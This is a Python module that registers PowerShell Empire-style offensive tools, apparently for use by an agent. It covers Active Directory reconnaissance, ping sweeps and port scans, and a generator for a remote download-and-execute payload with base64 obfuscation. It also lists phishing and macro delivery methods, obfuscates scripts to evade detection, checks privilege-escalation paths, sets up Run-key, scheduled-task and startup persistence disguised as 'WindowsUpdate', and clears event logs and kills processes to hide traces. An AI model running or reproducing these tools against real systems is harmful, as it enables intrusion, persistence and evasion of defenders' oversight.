#!/usr/bin/env python3

import os
import subprocess
import json
import base64
import tempfile
from typing import Dict, Any, List, Optional
import logging
import time

logger = logging.getLogger("empire_tools")

# Set tool namespace
TOOL_NAMESPACE = "empire"

class EmpireOperations:
    """Advanced PowerShell Empire operations"""
    
    def __init__(self):
        self.ps_executor = None
        self.empire_installed = False
        self.session_id = None
    
    def _check_empire_installation(self) -> bool:
        """Check if PowerShell Empire is available"""
        try:
            # Check for Empire installation
            check_cmd = """
            $empireModules = Get-Module -ListAvailable | Where-Object { 
                $_.Name -like '*Empire*' -or $_.Name -like '*PowerSploit*' 
            }
            if ($empireModules.Count -gt 0) {
                'EMPIRE_AVAILABLE'
            } else {
                'EMPIRE_NOT_FOUND'
            }
            """
            
            result = subprocess.run(
                ["powershell", "-Command", check_cmd],
                capture_output=True, text=True, timeout=10
            )
            
            if "EMPIRE_AVAILABLE" in result.stdout:
                self.empire_installed = True
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error checking Empire installation: {e}")
            return False
    
    def _execute_empire_script(self, script_content: str, timeout: int = 60) -> Dict[str, Any]:
        """Execute Empire PowerShell script safely"""
        try:
            # Create temporary script file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as f:
                f.write(script_content)
                script_path = f.name
            
            # Execute the script
            cmd = ["powershell", "-ExecutionPolicy", "Bypass", "-File", script_path]
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            
            # Clean up
            os.unlink(script_path)
            
            return {
                "success": result.returncode == 0,
                "output": result.stdout.strip(),
                "error": result.stderr.strip() if result.stderr else None,
                "exit_code": result.returncode
            }
            
        except subprocess.TimeoutExpired:
            os.unlink(script_path) if 'script_path' in locals() else None
            return {"success": False, "error": f"Script timed out after {timeout} seconds"}
        except Exception as e:
            return {"success": False, "error": str(e)}

empire_ops = EmpireOperations()

# Empire Setup and Environment Tools
def empire_check_installation(**kwargs) -> Dict[str, Any]:
    """Check if PowerShell Empire is installed and available"""
    available = empire_ops._check_empire_installation()
    
    check_script = """
    $info = @{
        PowerShellVersion = $PSVersionTable.PSVersion.ToString()
        ExecutionPolicy = Get-ExecutionPolicy
        EmpireModules = @()
        PowerSploitModules = @()
        Availability = 'NOT_AVAILABLE'
    }
    
    # Check for Empire modules
    $empireModules = Get-Module -ListAvailable | Where-Object { $_.Name -like '*Empire*' }
    $info.EmpireModules = $empireModules | Select-Object Name, Version, ModuleBase
    
    # Check for PowerSploit modules  
    $psModules = Get-Module -ListAvailable | Where-Object { $_.Name -like '*PowerSploit*' }
    $info.PowerSploitModules = $psModules | Select-Object Name, Version, ModuleBase
    
    if ($empireModules.Count -gt 0 -or $psModules.Count -gt 0) {
        $info.Availability = 'AVAILABLE'
    }
    
    $info | ConvertTo-Json -Depth 3
    """
    
    return empire_ops._execute_empire_script(check_script)

def empire_setup_environment(execution_policy: str = "Bypass", **kwargs) -> Dict[str, Any]:
    """Set up PowerShell environment for Empire operations"""
    setup_script = f"""
    try {{
        # Set execution policy
        Set-ExecutionPolicy -ExecutionPolicy {execution_policy} -Scope Process -Force
        
        # Import common modules if available
        $modules = @('PowerSploit', 'Empire', 'Invoke-Obfuscation')
        $imported = @()
        $failed = @()
        
        foreach ($module in $modules) {{
            try {{
                Import-Module $module -ErrorAction SilentlyContinue
                if (Get-Module $module) {{
                    $imported += $module
                }}
            }} catch {{
                $failed += $module
            }}
        }}
        
        @{{
            Status = 'SUCCESS'
            ExecutionPolicy = Get-ExecutionPolicy
            ImportedModules = $imported
            FailedModules = $failed
            PSVersion = $PSVersionTable.PSVersion.ToString()
        }} | ConvertTo-Json
        
    }} catch {{
        @{{
            Status = 'ERROR'
            Error = $_.Exception.Message
        }} | ConvertTo-Json
    }}
    """
    
    return empire_ops._execute_empire_script(setup_script)

# Reconnaissance Tools
def empire_domain_recon(domain: str = None, **kwargs) -> Dict[str, Any]:
    """Perform domain reconnaissance using PowerShell"""
    domain_param = f"'{domain}'" if domain else "$env:USERDNSDOMAIN"
    
    recon_script = f"""
    try {{
        $domain = {domain_param}
        $results = @{{
            Domain = $domain
            DomainInfo = $null
            DomainControllers = @()
            Users = @()
            Computers = @()
            Groups = @()
            Trusts = @()
            Error = $null
        }}
        
        if ($domain) {{
            # Get domain information
            try {{
                $domainObj = Get-ADDomain -Identity $domain -ErrorAction SilentlyContinue
                $results.DomainInfo = $domainObj | Select-Object Name, DNSRoot, DomainMode, Forest
            }} catch {{
                $results.Error = "AD module not available or access denied"
            }}
            
            # Get domain controllers
            try {{
                $dcs = Get-ADDomainController -Filter * -ErrorAction SilentlyContinue
                $results.DomainControllers = $dcs | Select-Object Name, IPv4Address, OperatingSystem
            }} catch {{ }}
            
            # Get users (limited)
            try {{
                $users = Get-ADUser -Filter * -Properties LastLogonDate -ResultSetSize 100 -ErrorAction SilentlyContinue
                $results.Users = $users | Select-Object Name, SamAccountName, Enabled, LastLogonDate
            }} catch {{ }}
            
            # Get computers
            try {{
                $computers = Get-ADComputer -Filter * -Properties OperatingSystem -ResultSetSize 50 -ErrorAction SilentlyContinue
                $results.Computers = $computers | Select-Object Name, DNSHostName, OperatingSystem, Enabled
            }} catch {{ }}
            
            # Get groups
            try {{
                $groups = Get-ADGroup -Filter * -ResultSetSize 50 -ErrorAction SilentlyContinue
                $results.Groups = $groups | Select-Object Name, GroupCategory, GroupScope
            }} catch {{ }}
        }}
        
        $results | ConvertTo-Json -Depth 3
        
    }} catch {{
        @{{
            Error = $_.Exception.Message
            Domain = $domain
        }} | ConvertTo-Json
    }}
    """
    
    return empire_ops._execute_empire_script(recon_script)

def empire_network_discovery(**kwargs) -> Dict[str, Any]:
    """Discover network hosts and services"""
    discovery_script = """
    try {
        $results = @{
            LocalNetwork = @()
            ActiveHosts = @()
            OpenPorts = @()
            NetworkShares = @()
        }
        
        # Get network configuration
        $netConfig = Get-NetIPConfiguration | Where-Object { $_.IPv4Address -ne $null }
        $results.LocalNetwork = $netConfig | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway
        
        # Quick ping sweep of local subnet (first 20 IPs)
        $subnet = ($netConfig[0].IPv4Address.IPAddress -split '\.')[0..2] -join '.'
        $activeHosts = @()
        
        1..20 | ForEach-Object {
            $ip = "$subnet.$_"
            if (Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) {
                $activeHosts += $ip
            }
        }
        $results.ActiveHosts = $activeHosts
        
        # Check common ports on active hosts (first 5)
        $commonPorts = @(22, 23, 53, 80, 135, 139, 443, 445, 3389, 5985, 5986)
        $openPorts = @()
        
        $activeHosts[0..4] | ForEach-Object {
            $host = $_
            $commonPorts | ForEach-Object {
                $port = $_
                if (Test-NetConnection $host -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue) {
                    $openPorts += @{Host = $host; Port = $port}
                }
            }
        }
        $results.OpenPorts = $openPorts
        
        # Discover network shares
        try {
            $shares = Get-SmbShare -ErrorAction SilentlyContinue
            $results.NetworkShares = $shares | Select-Object Name, Path, Description
        } catch { }
        
        $results | ConvertTo-Json -Depth 3
        
    } catch {
        @{
            Error = $_.Exception.Message
        } | ConvertTo-Json
    }
    """
    
    return empire_ops._execute_empire_script(discovery_script, timeout=120)

# Payload Generation Tools
def empire_generate_payload(payload_type: str = "powershell", 
                          listener_ip: str = "127.0.0.1",
                          listener_port: int = 443,
                          obfuscation: bool = False, **kwargs) -> Dict[str, Any]:
    """Generate Empire-style payload"""
    
    obfuscation_flag = "true" if obfuscation else "false"
    
    payload_script = f"""
    try {{
        $payloadType = '{payload_type}'
        $listenerIP = '{listener_ip}'
        $listenerPort = {listener_port}
        $obfuscate = ${obfuscation_flag}
        
        $results = @{{
            PayloadType = $payloadType
            ListenerIP = $listenerIP
            ListenerPort = $listenerPort
            Payload = ''
            EncodedPayload = ''
            DeliveryMethods = @()
        }}
        
        # Generate basic PowerShell payload
        if ($payloadType -eq 'powershell') {{
            $payload = @"
IEX (New-Object Net.WebClient).DownloadString('http://$listenerIP`:$listenerPort/agent')
"@
            
            if ($obfuscate) {{
                # Basic obfuscation
                $payload = $payload -replace 'IEX', 'Invoke-Expression'
                $payload = $payload -replace 'New-Object', 'New-Object'
                $payload = $payload -replace 'Net.WebClient', 'System.Net.WebClient'
                
                # Base64 encode
                $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
                $encodedPayload = [Convert]::ToBase64String($bytes)
                $payload = "powershell -EncodedCommand $encodedPayload"
            }}
            
            $results.Payload = $payload
            $results.EncodedPayload = if ($obfuscate) {{ $encodedPayload }} else {{ '' }}
        }}
        
        # Suggest delivery methods
        $results.DeliveryMethods = @(
            'Email attachment (.docm, .xlsm)',
            'USB drop (.lnk files)', 
            'Phishing website',
            'SMB share',
            'PowerShell one-liner',
            'HTA file',
            'Macro-enabled document'
        )
        
        $results | ConvertTo-Json -Depth 2
        
    }} catch {{
        @{{
            Error = $_.Exception.Message
        }} | ConvertTo-Json
    }}
    """
    
    return empire_ops._execute_empire_script(payload_script)

def empire_obfuscate_script(script_content: str, level: int = 1, **kwargs) -> Dict[str, Any]:
    """Obfuscate PowerShell script to evade detection"""
    
    # Escape single quotes in script content
    escaped_script = script_content.replace("'", "''")
    
    obfuscation_script = f"""
    try {{
        $originalScript = '{escaped_script}'
        $obfuscationLevel = {level}
        
        $results = @{{
            OriginalScript = $originalScript
            ObfuscatedScript = ''
            ObfuscationTechniques = @()
            Base64Encoded = ''
        }}
        
        $obfuscated = $originalScript
        $techniques = @()
        
        # Level 1: Basic string replacement
        if ($obfuscationLevel -ge 1) {{
            $obfuscated = $obfuscated -replace 'IEX', 'Invoke-Expression'
            $obfuscated = $obfuscated -replace 'iex', 'Invoke-Expression'
            $obfuscated = $obfuscated -replace 'New-Object', 'New-Object'
            $techniques += 'String replacement'
        }}
        
        # Level 2: Variable randomization
        if ($obfuscationLevel -ge 2) {{
            $randomVar1 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {{[char]$_}})
            $randomVar2 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {{[char]$_}})
            
            $obfuscated = "`$$randomVar1 = '$obfuscated'; Invoke-Expression `$$randomVar1"
            $techniques += 'Variable randomization'
        }}
        
        # Level 3: Base64 encoding
        if ($obfuscationLevel -ge 3) {{
            $bytes = [System.Text.Encoding]::Unicode.GetBytes($obfuscated)
            $base64 = [Convert]::ToBase64String($bytes)
            $results.Base64Encoded = $base64
            $obfuscated = "powershell -EncodedCommand $base64"
            $techniques += 'Base64 encoding'
        }}
        
        $results.ObfuscatedScript = $obfuscated
        $results.ObfuscationTechniques = $techniques
        
        $results | ConvertTo-Json -Depth 2
        
    }} catch {{
        @{{
            Error = $_.Exception.Message
        }} | ConvertTo-Json
    }}
    """
    
    return empire_ops._execute_empire_script(obfuscation_script)

# Privilege Escalation Tools
def empire_privesc_check(**kwargs) -> Dict[str, Any]:
    """Check for privilege escalation opportunities"""
    privesc_script = """
    try {
        $results = @{
            CurrentPrivileges = @()
            VulnerableServices = @()
            WeakPermissions = @()
            UnquotedServicePaths = @()
            ScheduledTasks = @()
            AlwaysInstallElevated = $false
        }
        
        # Check current privileges
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
        $results.CurrentPrivileges = @{
            Username = $currentUser.Name
            IsAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
            Groups = $currentUser.Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }
        }
        
        # Check for vulnerable services
        $services = Get-WmiObject win32_service | Where-Object { $_.State -eq 'Running' }
        $vulnerableServices = @()
        foreach ($service in $services) {
            if ($service.PathName -notmatch '^".*"' -and $service.PathName -match ' ') {
                $vulnerableServices += @{
                    Name = $service.Name
                    PathName = $service.PathName
                    StartMode = $service.StartMode
                    Issue = 'Unquoted service path'
                }
            }
        }
        $results.VulnerableServices = $vulnerableServices
        
        # Check AlwaysInstallElevated
        try {
            $hklm = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
            $hkcu = Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
            $results.AlwaysInstallElevated = ($hklm.AlwaysInstallElevated -eq 1) -and ($hkcu.AlwaysInstallElevated -eq 1)
        } catch { }
        
        # Check scheduled tasks running as SYSTEM
        try {
            $tasks = Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq 'SYSTEM' -and $_.State -eq 'Ready' }
            $results.ScheduledTasks = $tasks | Select-Object TaskName, TaskPath, @{Name='NextRun';Expression={$_.NextRunTime}}
        } catch { }
        
        $results | ConvertTo-Json -Depth 3
        
    } catch {
        @{
            Error = $_.Exception.Message
        } | ConvertTo-Json
    }
    """
    
    return empire_ops._execute_empire_script(privesc_script)

# Persistence Tools  
def empire_establish_persistence(method: str = "registry", key_name: str = "WindowsUpdate", **kwargs) -> Dict[str, Any]:
    """Establish persistence using various methods"""
    
    persistence_script = f"""
    try {{
        $method = '{method}'
        $keyName = '{key_name}'
        
        $results = @{{
            Method = $method
            Success = $false
            Location = ''
            Payload = ''
            CleanupInstructions = ''
        }}
        
        switch ($method) {{
            'registry' {{
                try {{
                    $regPath = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                    $payload = "powershell.exe -WindowStyle Hidden -Command 'Start-Sleep 5; Write-Host Persistence_Test'"
                    
                    Set-ItemProperty -Path $regPath -Name $keyName -Value $payload -Force
                    $results.Success = $true
                    $results.Location = "$regPath\\$keyName"
                    $results.Payload = $payload
                    $results.CleanupInstructions = "Remove-ItemProperty -Path '$regPath' -Name '$keyName'"
                }} catch {{
                    $results.Success = $false
                }}
            }}
            
            'scheduledtask' {{
                try {{
                    $taskName = $keyName
                    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Write-Host Persistence_Test'"
                    $trigger = New-ScheduledTaskTrigger -AtLogOn
                    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
                    
                    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
                    $results.Success = $true
                    $results.Location = "Scheduled Tasks\\$taskName"
                    $results.CleanupInstructions = "Unregister-ScheduledTask -TaskName '$taskName' -Confirm:`$false"
                }} catch {{
                    $results.Success = $false
                }}
            }}
            
            'startup' {{
                try {{
                    $startupPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
                    $scriptPath = "$startupPath\\$keyName.bat"
                    $payload = '@echo off`npowershell.exe -WindowStyle Hidden -Command "Write-Host Persistence_Test"'
                    
                    $payload | Out-File -FilePath $scriptPath -Encoding ASCII -Force
                    $results.Success = $true
                    $results.Location = $scriptPath
                    $results.CleanupInstructions = "Remove-Item '$scriptPath' -Force"
                }} catch {{
                    $results.Success = $false
                }}
            }}
        }}
        
        $results | ConvertTo-Json -Depth 2
        
    }} catch {{
        @{{
            Error = $_.Exception.Message
            Method = $method
        }} | ConvertTo-Json
    }}
    """
    
    return empire_ops._execute_empire_script(persistence_script)

# Cleanup Tools
def empire_cleanup_artifacts(artifact_types: List[str] = None, **kwargs) -> Dict[str, Any]:
    """Clean up Empire artifacts and traces"""
    
    if artifact_types is None:
        artifact_types = ["registry", "files", "logs", "processes"]
    
    artifact_list = "', '".join(artifact_types)
    
    cleanup_script = f"""
    try {{
        $artifactTypes = @('{artifact_list}')
        
        $results = @{{
            CleanupPerformed = @()
            CleanupFailed = @()
            RemainingArtifacts = @()
        }}
        
        foreach ($type in $artifactTypes) {{
            switch ($type) {{
                'registry' {{
                    try {{
                        # Clean common persistence locations
                        $runKeys = @(
                            "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                        )
                        
                        foreach ($key in $runKeys) {{
                            $props = Get-ItemProperty $key -ErrorAction SilentlyContinue
                            if ($props) {{
                                $props.PSObject.Properties | Where-Object {{ 
                                    $_.Value -like '*powershell*' -or $_.Value -like '*empire*' 
                                }} | ForEach-Object {{
                                    Remove-ItemProperty -Path $key -Name $_.Name -ErrorAction SilentlyContinue
                                    $results.CleanupPerformed += "Registry: $key\\$($_.Name)"
                                }}
                            }}
                        }}
                    }} catch {{
                        $results.CleanupFailed += "Registry cleanup failed: $($_.Exception.Message)"
                    }}
                }}
                
                'files' {{
                    try {{
                        # Clean temporary files
                        $tempPaths = @($env:TEMP, $env:TMP, "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                        
                        foreach ($path in $tempPaths) {{
                            if (Test-Path $path) {{
                                Get-ChildItem $path -Filter "*.ps1" -ErrorAction SilentlyContinue | 
                                Where-Object {{ $_.LastWriteTime -gt (Get-Date).AddHours(-24) }} |
                                ForEach-Object {{
                                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                                    $results.CleanupPerformed += "File: $($_.FullName)"
                                }}
                            }}
                        }}
                    }} catch {{
                        $results.CleanupFailed += "File cleanup failed: $($_.Exception.Message)"
                    }}
                }}
                
                'processes' {{
                    try {{
                        # Clean suspicious processes
                        Get-Process | Where-Object {{ 
                            $_.ProcessName -like '*empire*' -or 
                            $_.ProcessName -like '*powershell*' -and $_.CPU -gt 5 
                        }} | ForEach-Object {{
                            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                            $results.CleanupPerformed += "Process: $($_.ProcessName) (PID: $($_.Id))"
                        }}
                    }} catch {{
                        $results.CleanupFailed += "Process cleanup failed: $($_.Exception.Message)"
                    }}
                }}
                
                'logs' {{
                    try {{
                        # Clear PowerShell event logs (requires admin)
                        $logs = @('Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational')
                        foreach ($log in $logs) {{
                            try {{
                                wevtutil cl "$log"
                                $results.CleanupPerformed += "Log: $log"
                            }} catch {{
                                $results.CleanupFailed += "Log cleanup failed for $log"
                            }}
                        }}
                    }} catch {{
                        $results.CleanupFailed += "Log cleanup failed: $($_.Exception.Message)"
                    }}
                }}
            }}
        }}
        
        $results | ConvertTo-Json -Depth 2
        
    }} catch {{
        @{{
            Error = $_.Exception.Message
        }} | ConvertTo-Json
    }}
    """
    
    return empire_ops._execute_empire_script(cleanup_script)

# Tool Registry
TOOL_REGISTRY = {
    "check_installation": empire_check_installation,
    "setup_environment": empire_setup_environment,
    "domain_recon": empire_domain_recon,
    "network_discovery": empire_network_discovery,
    "generate_payload": empire_generate_payload,
    "obfuscate_script": empire_obfuscate_script,
    "privesc_check": empire_privesc_check,
    "establish_persistence": empire_establish_persistence,
    "cleanup_artifacts": empire_cleanup_artifacts
}

print("✅ PowerShell Empire advanced tools loaded")